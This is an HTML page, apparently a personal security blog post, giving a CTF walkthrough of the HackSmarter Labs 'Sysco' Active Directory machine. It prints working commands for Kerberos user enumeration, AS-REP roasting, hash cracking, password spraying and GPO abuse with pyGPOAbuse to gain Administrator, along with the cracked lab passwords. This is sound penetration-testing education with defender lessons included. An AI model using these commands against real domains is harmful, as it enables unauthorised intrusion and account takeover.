@@ -1,0 +1,525 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Sysco - HackSmarter Labs CTF Walkthrough | Zerotrace Logs</title>
+  <meta name="description" content="Complete walkthrough of Sysco machine from HackSmarter Labs. Learn AS-REP Roasting, Password Spraying, Credential Reuse, and GPO Abuse techniques on Windows Server 2022." />
+
+  <!-- Essential Open Graph tags for LinkedIn -->
+  <meta property="og:title" content="Sysco CTF Walkthrough - HackSmarter Labs | Z3rotrace" />
+  <meta property="og:description" content="Complete walkthrough covering AS-REP Roasting, Password Spraying, Credential Reuse, and GPO Abuse for privilege escalation on Windows Server 2022 Active Directory." />
+  <meta property="og:image" content="https://z3rotrace.live/assets/sysco/bloodhound-gpo-privileges.png" />
+  <meta property="og:url" content="https://z3rotrace.live/walkthroughs/sysco.html" />
+  <meta property="og:type" content="article" />
+
+  <!-- Twitter Card tags -->
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="Sysco CTF Walkthrough - HackSmarter Labs | Z3rotrace" />
+  <meta name="twitter:description" content="Complete walkthrough covering AS-REP Roasting, Password Spraying, Credential Reuse, and GPO Abuse for privilege escalation on Windows Server 2022 Active Directory." />
+  <meta name="twitter:image" content="https://z3rotrace.live/assets/sysco/bloodhound-gpo-privileges.png" />
+
+  <link rel="icon" type="image/png" href="../assets/favicon.png" sizes="32x32" />
+  <link rel="apple-touch-icon" href="../assets/favicon.png" />
+  <link rel="stylesheet" href="../style.css?v=4"/>
+  <style>
+    /* Machine info box styling */
+    .machine-info {
+      background: rgba(0, 170, 255, 0.05);
+      border: 1px solid rgba(0, 170, 255, 0.25);
+      border-left: 4px solid #c77dff;
+      border-radius: 8px;
+      padding: 1rem 1.25rem;
+      margin: 1.5rem 0;
+    }
+
+    .machine-info ul {
+      margin: 0;
+      padding-left: 0;
+    }
+
+    .machine-info li {
+      margin-bottom: 0.25rem;
+    }
+
+    .machine-info li::before {
+      color: #00aaff;
+    }
+
+    /* Attack chain summary box */
+    .attack-chain {
+      background: rgba(199, 125, 255, 0.05);
+      border: 1px solid rgba(199, 125, 255, 0.25);
+      border-left: 4px solid #c77dff;
+      border-radius: 8px;
+      padding: 1rem 1.25rem;
+      margin: 1.5rem 0;
+    }
+
+    .attack-chain ol {
+      margin: 0;
+    }
+
+    /* Credentials table styling */
+    .credentials-table {
+      width: 100%;
+      border-collapse: collapse;
+      margin: 1.5rem 0;
+      background: rgba(0, 170, 255, 0.03);
+      border-radius: 8px;
+      overflow: hidden;
+    }
+
+    .credentials-table th,
+    .credentials-table td {
+      padding: 0.75rem 1rem;
+      text-align: left;
+      border-bottom: 1px solid rgba(0, 170, 255, 0.15);
+    }
+
+    .credentials-table th {
+      background: rgba(0, 170, 255, 0.08);
+      color: #00aaff;
+      font-weight: 600;
+    }
+
+    .credentials-table tr:last-child td {
+      border-bottom: none;
+    }
+
+    .credentials-table tr:hover {
+      background: rgba(0, 170, 255, 0.05);
+    }
+
+    /* Lessons learned styling */
+    .lessons-learned li {
+      margin-bottom: 0.75rem;
+    }
+
+    /* Credential box inline */
+    .credential-box {
+      background: rgba(199, 125, 255, 0.08);
+      border: 1px solid rgba(199, 125, 255, 0.25);
+      border-radius: 6px;
+      padding: 0.75rem 1rem;
+      margin: 1rem 0;
+      font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
+    }
+
+    .credential-box strong {
+      color: #c77dff;
+    }
+  </style>
+</head>
+<body>
+<header>
+  <h1 class="terminal-title" aria-label="Zerotrace Logs">
+    <span class="prompt" aria-hidden="true">$</span>
+    <span class="typed" id="term-typing" aria-hidden="true"></span>
+    <span class="cursor" id="term-cursor" aria-hidden="true"></span>
+    <span class="sr-only">Zerotrace Logs</span>
+  </h1>
+</header>
+
+<!-- Side hamburger control -->
+<button id="sidebarToggle" class="hamburger-btn" aria-label="Toggle navigation" aria-controls="sidebar" aria-expanded="true">
+  <span class="sr-only">Toggle navigation</span>
+  <span class="hamburger-icon" aria-hidden="true"></span>
+</button>
+
+<!-- Sidebar navigation -->
+<aside class="sidebar" id="sidebar" aria-label="Main navigation">
+  <div class="sidebar-header">
+    <h3>Navigate</h3>
+    <button id="sidebarClose" class="sidebar-close" aria-label="Close navigation"><span aria-hidden="true">x</span></button>
+  </div>
+  <div class="sidebar-content">
+    <ul class="sidebar-nav">
+      <li><a href="../index.html">Home</a></li>
+      <li class="has-submenu">
+        <button class="submenu-toggle" aria-expanded="false"><span class="arrow" aria-hidden="true"></span>Writeups</button>
+        <ul class="submenu" hidden>
+          <li><a href="../writeups/welcome.html">Welcome - ADCS ESC1</a></li>
+          <li><a href="../writeups/staged.html">Staged - HackSmarter Labs</a></li>
+          <li><a href="../writeups/buildingmagic.html">BuildingMagic - HackSmarter Labs</a></li>
+          <li><a href="../writeups/arasaka.html">Arasaka - HackSmarter Labs</a></li>
+          <li><a href="../writeups/midgarden2-badsuccessor.html">Midgarden2 - BadSuccessor</a></li>
+          <li><a href="../writeups/banksmarter.html">BankSmarter - HackSmarter Labs</a></li>
+          <li><a href="../writeups/ascension.html">Ascension - HackSmarter Labs</a></li>
+          <li><a href="../writeups/slayer.html">Slayer - HackSmarter Labs</a></li>
+          <li><a href="../writeups/ps-file-transfer-dns.html">PS File Transfer via DNS Lookup</a></li>
+          <li><a href="../writeups/sliver-c2-getting-started.html">Getting Started with Sliver C2</a></li>
+        </ul>
+      </li>
+      <li class="has-submenu">
+        <button class="submenu-toggle" aria-expanded="true"><span class="arrow" aria-hidden="true"></span>Machines Walkthroughs</button>
+        <ul class="submenu">
+          <li><a href="sharethepain.html">ShareThePain</a></li>
+          <li><a href="sysco.html" aria-current="page">Sysco</a></li>
+        </ul>
+      </li>
+      <li><a href="../vector3.html">Certification Journey</a></li>
+      <li class="has-submenu">
+        <button class="submenu-toggle" aria-expanded="false"><span class="arrow" aria-hidden="true"></span>Projects</button>
+        <ul class="submenu" hidden>
+          <li><a href="../projects/dual-cloud-c2-redirector.html">Dual Cloud Redirector C2</a></li>
+        </ul>
+      </li>
+    </ul>
+  </div>
+</aside>
+<div class="sidebar-backdrop" id="sidebarBackdrop" aria-hidden="true"></div>
+
+<section>
+  <h2>Sysco - HackSmarter Labs CTF Walkthrough</h2>
+
+  <div class="machine-info">
+    <ul>
+      <li><strong>Platform:</strong> HackSmarter Labs</li>
+      <li><strong>Difficulty:</strong> Intermediate</li>
+      <li><strong>OS:</strong> Windows Server 2022</li>
+      <li><strong>Key Topics:</strong> Active Directory, AS-REP Roasting, Password Spraying, Credential Reuse, GPO Abuse</li>
+    </ul>
+  </div>
+
+  <h3>Scenario</h3>
+  <p>Sysco is a Managed Service Provider that has tasked us with performing an external penetration test on their Active Directory domain. The objective is to obtain an initial foothold, move laterally, and escalate privileges while evading Antivirus detection to achieve Domain Administrator privileges.</p>
+
+  <h2>Enumeration</h2>
+
+  <h3><span class="step">[Step 1]</span> Nmap Scan</h3>
+  <p>I started with a comprehensive port scan to identify all open services:</p>
+  <pre><code>$ nmap -p- -T4 -sC -sV -Pn 10.0.30.129 -oN nmap_scan</code></pre>
+
+  <div class="note">
+    <strong>Note:</strong> The <code>-oN</code> flag saves output in normal format (human-readable). The original used <code>-o</code> which is not a valid nmap flag.
+  </div>
+
+  <pre><code>PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Apache httpd 2.4.58 ((Win64) OpenSSL/3.1.3 PHP/8.2.12)
+|_http-title: Index - Sysco MSP
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: SYSCO.LOCAL)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP
+3269/tcp  open  tcpwrapped
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+9389/tcp  open  mc-nmf        .NET Message Framing</code></pre>
+
+  <p>Key findings from the scan:</p>
+  <ul>
+    <li>This is a Windows Server 2022 Domain Controller (<code>DC01.SYSCO.LOCAL</code>)</li>
+    <li>Apache web server running on port 80</li>
+    <li>Standard AD services (Kerberos, LDAP, SMB)</li>
+    <li>RDP is available on port 3389</li>
+  </ul>
+
+  <h3><span class="step">[Step 2]</span> Web Enumeration</h3>
+  <p>Browsing to <code>http://sysco.local/#team</code>, I found a team page with employee names:</p>
+
+  <p><img src="../assets/sysco/team-page-employees.png" alt="Team page showing employee names on the Sysco MSP website" loading="lazy"></p>
+
+  <p>I extracted the following names:</p>
+  <pre><code>Greg Shields
+Sarah Johnson
+Jack Dowland
+Lainey Moore</code></pre>
+
+  <p>Running directory enumeration with feroxbuster:</p>
+  <pre><code>$ feroxbuster -u http://sysco.local/ -w /usr/share/wordlists/dirb/big.txt</code></pre>
+
+  <p>This revealed a Roundcube webmail service:</p>
+
+  <p><img src="../assets/sysco/roundcube-webmail-login.png" alt="Roundcube webmail login page" loading="lazy"></p>
+
+  <h3><span class="step">[Step 3]</span> Username Enumeration</h3>
+  <p>Using the employee names, I generated potential username formats with username-anarchy:</p>
+  <pre><code>$ ./username-anarchy --input-file names.txt --select-format first,flast,first.last,firstl > users.list</code></pre>
+
+  <div class="question">
+    <strong>What is username-anarchy?</strong>
+  </div>
+  <div class="answer">
+    A tool that generates common username permutations from real names. Organizations typically use consistent naming conventions (like <code>first.last</code> or <code>flast</code>), so generating multiple formats increases the chance of finding valid accounts.
+  </div>
+
+  <p>Then I validated which usernames exist in the domain using Kerbrute:</p>
+  <pre><code>$ kerbrute userenum -d SYSCO.LOCAL users.list --dc DC01.SYSCO.LOCAL</code></pre>
+
+  <p><img src="../assets/sysco/kerbrute-user-enumeration.png" alt="Kerbrute results showing valid users in the domain" loading="lazy"></p>
+
+  <div class="question">
+    <strong>What is Kerbrute?</strong>
+  </div>
+  <div class="answer">
+    Kerbrute performs fast username enumeration against Kerberos. Unlike SMB enumeration, Kerberos responds differently for valid vs. invalid usernames, allowing attackers to confirm which accounts exist without triggering account lockouts.
+  </div>
+
+  <p>Valid usernames discovered:</p>
+  <ul>
+    <li><code>greg.shields</code></li>
+    <li><code>lainey.moore</code></li>
+    <li><code>jack.dowland</code></li>
+  </ul>
+
+  <h2>Initial Access - AS-REP Roasting</h2>
+
+  <div class="question">
+    <strong>What is AS-REP Roasting?</strong>
+  </div>
+  <div class="answer">
+    AS-REP Roasting targets Active Directory accounts that have Kerberos pre-authentication disabled. When this setting is enabled, anyone can request an Authentication Server Response (AS-REP) for that user, which contains encrypted data that can be cracked offline to recover the plaintext password.
+  </div>
+
+  <h3><span class="step">[Step 4]</span> AS-REP Roasting Attack</h3>
+  <p>I attempted AS-REP Roasting against the valid users:</p>
+  <pre><code>$ nxc ldap 10.0.30.129 -u valid_users.txt -p '' --asreproast asreproasting_hash</code></pre>
+
+  <pre><code>LDAP  10.0.30.129  389  DC01  [*] Windows Server 2022 Build 20348 (name:DC01) (domain:SYSCO.LOCAL)
+LDAP  10.0.30.129  389  DC01  $krb5asrep$23$jack.dowland@SYSCO.LOCAL:d64e9c59...</code></pre>
+
+  <p>User <code>jack.dowland</code> has pre-authentication disabled. I cracked the hash using hashcat:</p>
+  <pre><code>$ hashcat -m 18200 asreproasting_hash /usr/share/wordlists/rockyou.txt</code></pre>
+
+  <pre><code>$krb5asrep$23$jack.dowland@SYSCO.LOCAL:...:musicman1</code></pre>
+
+  <div class="credential-box">
+    <strong>Credentials obtained:</strong> jack.dowland:musicman1
+  </div>
+
+  <p>I verified the credentials work:</p>
+
+  <p><img src="../assets/sysco/netexec-credential-validation.png" alt="NetExec validating the cracked credentials" loading="lazy"></p>
+
+  <h2>Lateral Movement</h2>
+
+  <h3><span class="step">[Step 5]</span> BloodHound Collection</h3>
+  <p>I collected Active Directory data for analysis:</p>
+  <pre><code>$ bloodhound-python -u jack.dowland -p 'musicman1' -d SYSCO.LOCAL -ns 10.0.30.129 -c all</code></pre>
+
+  <p><img src="../assets/sysco/bloodhound-collection.png" alt="BloodHound data collection output" loading="lazy"></p>
+
+  <div class="question">
+    <strong>What is BloodHound?</strong>
+  </div>
+  <div class="answer">
+    BloodHound is an Active Directory reconnaissance tool that maps relationships between users, groups, computers, and permissions. It visualizes attack paths that can lead to domain compromise, making it essential for both attackers and defenders.
+  </div>
+
+  <p>BloodHound did not reveal any direct privilege escalation paths for <code>jack.dowland</code>, and the user had no access to interesting file shares.</p>
+
+  <h3><span class="step">[Step 6]</span> Credential Reuse - Roundcube</h3>
+  <p>Since Jack is an employee, I tested his credentials against the Roundcube webmail and successfully logged in:</p>
+
+  <p><img src="../assets/sysco/roundcube-login-success.png" alt="Successful Roundcube webmail login" loading="lazy"></p>
+
+  <p>In his mailbox, I found an email sent to <code>lainey.moore</code> with a Cisco router configuration file attached:</p>
+
+  <p><img src="../assets/sysco/email-cfg-attachment.png" alt="Email with Cisco configuration file attachment" loading="lazy"></p>
+
+  <h3><span class="step">[Step 7]</span> Cracking the Cisco Secret</h3>
+  <p>The configuration file contained an enable secret:</p>
+  <pre><code>enable secret 5 $1$mERr$isugnYiHsjHT.i.tc2GDY.</code></pre>
+
+  <p><img src="../assets/sysco/cisco-config-contents.png" alt="Cisco configuration file showing the enable secret hash" loading="lazy"></p>
+
+  <div class="question">
+    <strong>What is Cisco "secret 5"?</strong>
+  </div>
+  <div class="answer">
+    In Cisco IOS, <code>secret 5</code> indicates the password is hashed using MD5-crypt. This is more secure than type 7 (which is reversible), but still crackable with sufficient computing power. Type 5 hashes begin with <code>$1$</code>.
+  </div>
+
+  <p>I cracked this hash with hashcat using mode 500 (MD5-crypt):</p>
+  <pre><code>$ hashcat -m 500 router_md5_hash /usr/share/wordlists/rockyou.txt</code></pre>
+
+  <pre><code>$ hashcat -m 500 router_md5_hash --show</code></pre>
+
+  <pre><code>$1$mERr$isugnYiHsjHT.i.tc2GDY.:Chocolate1</code></pre>
+
+  <h3><span class="step">[Step 8]</span> Password Spraying</h3>
+
+  <div class="question">
+    <strong>What is Password Spraying?</strong>
+  </div>
+  <div class="answer">
+    Password spraying tests a single password against many accounts, rather than many passwords against one account. This approach avoids account lockouts while exploiting password reuse - a common issue when employees use the same password across systems.
+  </div>
+
+  <p>With a new potential password, I sprayed it against domain users and got a hit on <code>lainey.moore</code>:</p>
+  <pre><code>$ nxc smb 10.0.30.129 -u valid_users.txt -p 'Chocolate1'</code></pre>
+
+  <p><img src="../assets/sysco/password-spray-lainey.png" alt="Password spray revealing valid credentials for lainey.moore" loading="lazy"></p>
+
+  <div class="credential-box">
+    <strong>Credentials obtained:</strong> lainey.moore:Chocolate1
+  </div>
+
+  <h3><span class="step">[Step 9]</span> Enumerating Lainey's Access</h3>
+  <p>BloodHound showed that <code>lainey.moore</code> is a member of both <code>Remote Desktop Users</code> and <code>Remote Management Users</code>:</p>
+
+  <p><img src="../assets/sysco/bloodhound-group-memberships.png" alt="BloodHound showing Lainey's group memberships" loading="lazy"></p>
+
+  <h3><span class="step">[Step 10]</span> RDP Session and More Credentials</h3>
+  <p>I connected via RDP:</p>
+  <pre><code>$ xfreerdp /v:10.0.30.129 /u:lainey.moore /p:'Chocolate1'</code></pre>
+
+  <div class="note">
+    <strong>Note:</strong> The original used <code>xfreerdp3</code>, but the standard command is <code>xfreerdp</code>. Also, passwords with special characters should be quoted.
+  </div>
+
+  <p>On the desktop, I found a PuTTY shortcut with embedded credentials:</p>
+
+  <p><img src="../assets/sysco/putty-shortcut-credentials.png" alt="PuTTY shortcut revealing hardcoded credentials" loading="lazy"></p>
+
+  <p>The shortcut revealed:</p>
+  <pre><code>C:\Users\lainey.moore\Documents\putty.exe -ssh netadmin@10.0.0.1 -pw 5y5coSmarter2025!!!</code></pre>
+
+  <div class="note">
+    <strong>Security Note:</strong> Storing passwords in shortcut arguments is a common but dangerous practice. Anyone with access to the desktop can view the full command line, exposing credentials in plaintext.
+  </div>
+
+  <p>I sprayed this password and discovered it works for <code>greg.shields</code>:</p>
+  <pre><code>$ nxc smb 10.0.30.129 -u valid_users.txt -p '5y5coSmarter2025!!!'</code></pre>
+
+  <p><img src="../assets/sysco/password-spray-greg.png" alt="Password spray revealing greg.shields uses the same password" loading="lazy"></p>
+
+  <div class="credential-box">
+    <strong>Credentials obtained:</strong> greg.shields:5y5coSmarter2025!!!
+  </div>
+
+  <h2>Privilege Escalation - GPO Abuse</h2>
+
+  <h3><span class="step">[Step 11]</span> Identifying the Attack Path</h3>
+  <p>BloodHound revealed that <code>greg.shields</code> has dangerous privileges over the Default Domain Policy GPO:</p>
+
+  <p><img src="../assets/sysco/bloodhound-gpo-privileges.png" alt="BloodHound showing greg.shields has GPO edit privileges" loading="lazy"></p>
+
+  <div class="question">
+    <strong>What is GPO Abuse?</strong>
+  </div>
+  <div class="answer">
+    Group Policy Objects (GPOs) control settings across Active Directory. If a user can modify a GPO that applies to privileged systems (like the Domain Controller), they can add malicious scheduled tasks or scripts that execute with SYSTEM privileges, effectively granting them administrative access.
+  </div>
+
+  <h3><span class="step">[Step 12]</span> Exploiting the GPO</h3>
+  <p>I used pyGPOAbuse to create a scheduled task that adds <code>greg.shields</code> to the local Administrators group:</p>
+  <pre><code>$ python3 pygpoabuse.py 'SYSCO.LOCAL/greg.shields:5y5coSmarter2025!!!' \
+    -gpo-id "31B2F340-016D-11D2-945F-00C04FB984F9" \
+    -command 'net localgroup Administrators greg.shields /add'</code></pre>
+
+  <div class="question">
+    <strong>What is the GPO ID 31B2F340-016D-11D2-945F-00C04FB984F9?</strong>
+  </div>
+  <div class="answer">
+    This is the well-known GUID for the "Default Domain Policy" GPO, which exists in every Active Directory domain. It applies to all users and computers in the domain by default.
+  </div>
+
+  <pre><code>[+] ScheduledTask TASK_48cc8916 created!</code></pre>
+
+  <p>After waiting for Group Policy to refresh (or forcing it with <code>gpupdate /force</code>), I connected with evil-winrm and confirmed Administrator access:</p>
+  <pre><code>$ evil-winrm -i 10.0.30.129 -u greg.shields -p '5y5coSmarter2025!!!'</code></pre>
+
+  <p><img src="../assets/sysco/administrator-access-confirmed.png" alt="Evil-WinRM session confirming Administrator access" loading="lazy"></p>
+
+  <h2>Attack Chain Summary</h2>
+  <div class="attack-chain">
+    <ol>
+      <li><strong>Web Enumeration</strong> - Discovered employee names on the company website</li>
+      <li><strong>Username Enumeration</strong> - Generated and validated usernames via Kerbrute</li>
+      <li><strong>AS-REP Roasting</strong> - Obtained and cracked credentials for <code>jack.dowland</code></li>
+      <li><strong>Credential Reuse</strong> - Used Jack's password to access Roundcube webmail</li>
+      <li><strong>Cisco Hash Cracking</strong> - Found and cracked a router config file to get a new password</li>
+      <li><strong>Password Spraying</strong> - Discovered the password works for <code>lainey.moore</code></li>
+      <li><strong>RDP Access</strong> - Found hardcoded credentials in a PuTTY shortcut</li>
+      <li><strong>Additional Password Spraying</strong> - Obtained access to <code>greg.shields</code></li>
+      <li><strong>GPO Abuse</strong> - Exploited GPO edit permissions to gain Administrator access</li>
+    </ol>
+  </div>
+
+  <h2>Credentials Summary</h2>
+  <table class="credentials-table">
+    <thead>
+      <tr>
+        <th>Username</th>
+        <th>Password</th>
+        <th>Source</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><code>jack.dowland</code></td>
+        <td><code>musicman1</code></td>
+        <td>AS-REP Roasting</td>
+      </tr>
+      <tr>
+        <td><code>lainey.moore</code></td>
+        <td><code>Chocolate1</code></td>
+        <td>Cisco config crack</td>
+      </tr>
+      <tr>
+        <td><code>greg.shields</code></td>
+        <td><code>5y5coSmarter2025!!!</code></td>
+        <td>PuTTY shortcut</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <h2>Lessons Learned</h2>
+
+  <h3><span class="step defender">For Defenders</span></h3>
+  <div class="answer lessons-learned">
+    <ul>
+      <li>Audit accounts with Kerberos pre-authentication disabled</li>
+      <li>Implement password policies that prevent common passwords</li>
+      <li>Monitor for password spraying attempts</li>
+      <li>Never store credentials in shortcuts or scripts</li>
+      <li>Restrict GPO modification rights to dedicated admin accounts</li>
+      <li>Use Privileged Access Workstations (PAWs) for administrative tasks</li>
+    </ul>
+  </div>
+
+  <h3><span class="step redteam">For Attackers</span></h3>
+  <div class="answer lessons-learned">
+    <ul>
+      <li>Always check webmail and other internal apps for credential reuse</li>
+      <li>Configuration files often contain crackable hashes</li>
+      <li>Password spraying discovered credentials can reveal reuse across accounts</li>
+      <li>BloodHound is essential for mapping privilege escalation paths in AD</li>
+    </ul>
+  </div>
+
+  <p><em>Walkthrough by Zerotrace | HackSmarter Labs</em></p>
+
+</section>
+
+<footer>
+  <div class="social-links" aria-label="Social media">
+    <a href="https://github.com/0x0Trace" class="social github" target="_blank" rel="noopener" aria-label="GitHub profile">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <path fill="#00B8D9" d="M12 .5C5.65.5.5 5.65.5 12c0 5.08 3.29 9.38 7.86 10.9.58.1.8-.25.8-.56 0-.27-.01-1.14-.02-2.07-3.2.7-3.88-1.36-3.88-1.36-.53-1.34-1.3-1.7-1.3-1.7-1.06-.73.08-.72.08-.72 1.17.08 1.78 1.2 1.78 1.2 1.05 1.79 2.75 1.27 3.42.97.11-.76.41-1.27.75-1.56-2.55-.29-5.23-1.28-5.23-5.7 0-1.26.45-2.3 1.2-3.11-.12-.29-.52-1.46.11-3.04 0 0 .97-.31 3.18 1.19a11.08 11.08 0 0 1 2.9-.39c.98 0 1.97.13 2.9.39 2.2-1.5 3.17-1.19 3.17-1.19.63 1.58.23 2.75.12 3.04.75.81 1.2 1.85 1.2 3.11 0 4.43-2.69 5.41-5.25 5.69.42.36.8 1.08.8 2.18 0 1.58-.02 2.85-.02 3.24 0 .31.21.67.81.55A10.52 10.52 0 0 0 23.5 12c0-6.35-5.15-11.5-11.5-11.5Z"/>
+      </svg>
+    </a>
+    <a href="mailto:contact@z3rotrace.live" class="social email" aria-label="E-mail">
+      <svg width="20" height="20" viewBox="0 0 512 512" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <path fill="#00B8D9" d="M502.3 190.8L327.4 338.9C304.3 358.3 271.7 358.3 248.6 338.9L9.7 190.8C3.2 185.5 0 178.3 0 171.2V80C0 53.5 21.5 32 48 32H464C490.5 32 512 53.5 512 80V171.2C512 178.3 508.8 185.5 502.3 190.8Z"/>
+        <path fill="#00B8D9" d="M0 255.1V432C0 458.5 21.5 480 48 480H464C490.5 480 512 458.5 512 432V255.1L343.9 392.7C304.5 423 247.6 423 208.1 392.7L0 255.1Z"/>
+      </svg>
+    </a>
+    <a href="https://www.linkedin.com/in/panagiotis-lampousis-2a100b392/" class="social linkedin" target="_blank" rel="noopener" aria-label="LinkedIn profile">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <path fill="#00B8D9" d="M4.98 3.5c0 1.38-1.13 2.5-2.5 2.5A2.5 2.5 0 0 1 0 3.5C0 2.12 1.12 1 2.49 1a2.5 2.5 0 0 1 2.49 2.5ZM.5 23.5h4V7.99h-4V23.5Zm7.5 0h4v-8.32c0-2.21 2.4-3.46 3.94-2.02.5.47.56 1.13.56 1.86v8.48h4v-9.56c0-5.06-5.5-4.86-6.5-2.38V8h-4c.06 1.05 0 15.5 0 15.5Z"/>
+      </svg>
+    </a>
+  </div>
+  <p>&copy; 2025 Zerotrace | Built by Zerotrace | <a href="../terms-of-use.html" style="color: #00B8D9; text-decoration: underline;">Terms of Use</a></p>
+</footer>
+<script src="../script.js"></script>
+</body>
+</html>
